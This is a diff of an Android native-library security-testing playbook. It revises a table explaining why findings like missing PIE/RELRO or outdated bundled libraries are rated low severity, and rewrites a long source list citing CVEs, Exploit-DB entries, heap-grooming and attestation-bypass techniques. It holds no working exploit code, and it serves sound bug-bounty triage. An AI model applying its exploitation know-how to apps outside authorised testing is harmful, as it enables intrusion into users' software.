-| "`libtarget.so` is missing PIE / RELRO / stack canaries / FORTIFY" | `lack_of_binary_hardening.lack_of_exploit_mitigations` = **P5**. It is a build-configuration observation with no attacker action attached. PIE in particular has been enforced since API 21, so a `Type: EXEC` result is usually a vendored prebuilt, not an exposure | A reachable memory-safety bug in **that same library**, with the missing mitigation named as the layer that would otherwise have blocked your chain (D16-053) |
+| "`libtarget.so` is missing PIE / RELRO / stack canaries / FORTIFY" | `lack_of_binary_hardening.lack_of_exploit_mitigations` = **P5**. It is a build-configuration observation with no attacker action attached. PIE has been enforced since API 21 and bionic refuses to `dlopen` an `ET_EXEC` object at all, so a `Type: EXEC` `.so` is dead weight or a shipped *executable* (D16-010), not an exposure | A reachable memory-safety bug in **that same library**, with the missing mitigation named as the layer that would otherwise have blocked your chain (D16-053) |
 | "The `.so` files are unstripped and expose internal function names" | `lack_of_binary_hardening.lack_of_obfuscation` = **P5**; MASTG-TEST-0288 is a MASVS-RESILIENCE item | A symbol or embedded path that reveals something concrete — an internal hostname, a build-server path, or the exact attestation routine you then bypass (D16-015 → D21) |
 | "The app bundles libwebp 1.3.0 / OpenSSL 1.1.1 / an old FFmpeg" | `using_components_with_known_vulnerabilities.outdated_software_version` = **P5**. Every programme in the corpus rejects a CVE with no exploit: PayPal ("without showing specific impact to the target application"), Reddit, Grab, HackenProof, Basecamp | The D16-005 reachability row plus a crash or ASan verdict through a real app surface (D16-046). Without that it belongs in the client's hardening appendix, stated as such |
 | A crash produced by `dlopen`-ing the library and calling its internal functions with malformed input | Google and Samsung both reject this in writing; it proves nothing about the app | Reconstruct the real caller's sequence and deliver the same input through the app's own surface (D16-046) |
@@ -2619,7 +2895,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 
 ## Sources
 
-- **Local senior-researcher corpus** (`local/skill-corpus-method.md`, `skill-corpus-classes.md`): the
+- **Senior-researcher corpus (public write-ups)**: the
   per-binary `readelf` mitigation audit and the NDK timeline (cookies r1, non-exec stack r4b, RELRO+BIND_NOW
   r8b, PIE r8c, `-Wformat-security` r9); the crash-vs-exploitability separation; dlmalloc heap grooming and
   the guard-allocation pattern; the "stack cookie only checks at RETURN" rule with the `zergRush` case; the
@@ -2630,13 +2906,13 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   downgrade; the versioned `untrusted_app_NN` SELinux domains; the native-pointer IPC-deserialisation gadget
   (`OpenSSLX509Certificate`, `VirtualRefBasePtr`); the stale-decoder-reached-from-Glide worked case; the
   analytics-only anti-fraud calibration.
-- **OWASP MASTG / MASWE / Mobile Top 10** (`primary/owasp-mastg.md`, `primary/owasp-mobile-top10.md`):
+- **OWASP MASTG / MASWE / Mobile Top 10**:
   MASTG-TEST-0222/-0223/-0288/-0043; MASTG-KNOW-0005/-0006/-0008; MASTG-TECH-0018/-0024/-0029/-0033/-0034/
   -0035/-0037/-0044/-0115/-0140/-0157; MASTG-TOOL-0001/-0003/-0028/-0030/-0033/-0036/-0037/-0107/-0129/
   -0152; MASWE-0044/-0045/-0050/-0061; the four documented stack-canary false positives (Flutter, the empty
   React Native release libraries, and the RN libraries with calls but no stack buffers); the jnitrace and
   `frida-trace` handler patterns.
-- **Mobile Hacking Lab research** (`primary/mobilehackinglab.md`): the `int * int` audit with CVE-2025-48595,
+- **Mobile Hacking Lab research**: the `int * int` audit with CVE-2025-48595,
   CVE-2026-0006 and CVE-2026-0049; signed truncation with CVE-2025-27363 and the Minikin/HarfBuzz/FreeType
   reachability chain; the two-source dimension mismatch; "reads become writes"; the poison/canary-allocator
   disclosure proof (283 bytes of poison consumed; 35.5% of pixels leaked in CVE-2025-64505); the delayed
@@ -2648,50 +2924,49 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   production-UBSan re-rating; the 0-click delivery-path enumeration and the `LocalImageResolver` MIME
   allowlist; the "state what the bug is not" calibration; the negative control and one-shot reproduction
   script standards.
-- **AOSP architecture and security model** (`architecture/aosp-core.md`, `architecture/security-model.md`,
-  `architecture/framework-internals.md`): the ~85% unsafe-memory-access figure; the platform mitigation table
+- **AOSP architecture and security model**: the ~85% unsafe-memory-access figure; the platform mitigation table
   by version (CFI 9, SCS/BoundSan/IntSan/Scudo/HWASan 10, MTE 12, BTI/PAC-RET 14, Rust 12); same-process
   HALs and the `sphal` namespace; linker namespaces and `public.libraries.txt` (targetSdk 24 gate); the
   `memfd`/in-memory load path; 16 KB page-size support; `isolatedProcess` and the SELinux `isolated_app`
   domain; the "do not claim an escalation `untrusted_app` cannot perform" rule.
-- **Frontier / behaviour-change research** (`frontier/modern-api-surfaces.md`,
-  `frontier/undertested-surfaces.md`): the 16 KB migration as an unreviewed dependency swap; the Android 14
+- **Frontier / behaviour-change research**: the 16 KB migration as an unreviewed dependency swap; the Android 14
   `mlock` 64 KB cap; Android 16 Mali GPU IOCTL filtering and the debuggable-variant workaround; the
   JNI-reachable-from-exported-component framing.
-- **Supply-chain and SDK research** (`realworld/sdk-supplychain-cves.md`): the LibRARIAN `.rodata` version
+- **Supply-chain and SDK research**: the LibRARIAN `.rodata` version
   regexes and the measured base rates (53/200 apps, 859 days stale, 529-day adoption lag, 91.15% version-ID
   accuracy); the libwebrtc SDP-munging reachability condition for CVE-2022-2294 with CVE-2023-7024 and
   CVE-2024-5493; the JNI-entry-to-vulnerable-parser pairing.
-- **Disclosed reports and community write-ups** (`realworld/h1-disclosed-mobile.md`,
-  `realworld/bugcrowd-intigriti-writeups.md`, `realworld/crossplatform-frameworks.md`,
-  `secondary/hrishikesh-hacktricks.md`, `secondary/sallam-hetmehta.md`, `secondary/sehno-gowthams.md`,
-  `secondary/indusface-singh-riya.md`, `secondary/writeups-realfinds.md`, `secondary/extra-community-sources.md`,
-  `secondary/frida-drozer-tooling.md`): H1 #1377748 (Evernote) and #1115864 (Mattermost) for library
+- **Disclosed reports and community write-ups**: H1 #1377748 (Evernote) and #1115864 (Mattermost) for library
   planting, with the `extractNativeLibs` caveat; Nextcloud #3399016 scoring 0.0 for a crash-only report;
   Oversecured's Android memory-corruption class and the TikTok/Samsung `System.load` paths; Microsoft Dirty
   Stream; `.init_array` neutralisation for early instrumentation; soSaver for runtime-decrypted libraries;
   the Flutter MethodChannel and React Native `nativeModuleProxy` enumeration scripts; the libc-hooking
   pattern for native-side checks; drozer `app.package.native` / `scanner.misc.native` and its own stated
   false-negative limitation; Google ASI campaign CVE list.
-- **Exploit-DB / CVE pattern mining** (`primary/exploitdb-cve-patterns.md`, `primary/mitre-attack-mobile.md`):
+- **Exploit-DB / CVE pattern mining**:
   CVE-2019-11932 (EDB 47515), CVE-2015-3864/CVE-2015-1538 (Stagefright, EDB 38226/38124/40436/39640),
   CVE-2016-3861 (EDB 40354), the LG parser set (EDB 41981/41982/41983, 42169/42171); ATT&CK T1575, T1658,
   T1404, T1623/T1623.001 (analytics AN1657/AN1741), T1631/T1631.001, T1625/T1625.001, T1407 with mitigation
-  M1006 (API 29 native-code-from-internal-storage restriction), T1617.
-- **Severity and programme economics** (`primary/bugcrowd-vrt-severity.md`, `primary/vrp-program-economics.md`,
-  `data/bugcrowd-vrt-full.csv` release 2026-07-08): the P1 landing nodes and the P5 fallbacks; AOSP's own
+  M1006 (API 29 restricts `exec` of files in the app home directory; `dlopen`/`System.load` unaffected — D16-039), T1617.
+- **Severity and programme economics** (release 2026-07-08): the P1 landing nodes and the P5 fallbacks; AOSP's own
   remote-vs-local ACE severity split; Google's mandatory-patch rule and "unreachable bugs" clause; Samsung's
   `dlopen` clause; TikTok's arbitrary-code-execution requirement; Meta's $300k / $120k / $20k ladder and
   interaction multipliers; the "CVE with no exploit" out-of-scope clauses at PayPal, Reddit, Grab,
   HackenProof and Basecamp.
-- **Bug-hunting discipline corpus** (`secondary/claude-bughunter.md`): the layer-ordering trap adapted to the
+- **Bug-hunting discipline corpus**: the layer-ordering trap adapted to the
   JNI boundary (D16-019); marker discipline adapted to poison-fill heap-disclosure proofs and the
   baseline-first check (D16-029); the body-diff rule applied to leaked output bytes; the Shell-Loop Ban and
   result counting for the per-`.so` sweeps (D16-008, D16-060); the multi-tool reproduction bar; the
   pre-severity gate against the Critical claim; retraction-appendix discipline and the do-not-retract-a-
   patched-finding rule; the evidence split of what to mask versus what to leave visible; and the chain-filing
   order (primitives first, consumer second, backfill the links).
-- **Gap analyses** (`gaps-*.md`): USB host/accessory and BLE channels as fully attacker-controlled inputs
+- **Gap analyses**: USB host/accessory and BLE channels as fully attacker-controlled inputs
   into native parsers; the ExoPlayer/Media3 attacker-set media URL reaching a native demuxer; the
   surface-to-phase budget that places D16 in the P7-adjacent half-day and the time-box rule that keeps it
   from eating the chaining pass.
+- **Engagement-derived additions (2026-10, generalised — no target named)**: native code mapped from another
+  package (D16-061); the manifest memory-mitigation attributes (D16-062); the GWP-ASan/MTE tombstone verdict
+  (D16-063); ASan on the real caller path via `wrap.sh` (D16-064); the Frida ≥ 17 API forms, `-D "$SERIAL"`
+  and the spawn-collision rule (Triage order 5); the device-shell quoting and `run-as` corrections (D16-019,
+  D16-021, D16-035, D16-039); the host-neutral ELF tool resolver (D16-001, D16-008); the shipped-vs-loaded diff
+  (D16-002); the transform-proxy layer (D16-037); the one-benign-request rule for recovered credentials (D16-022).
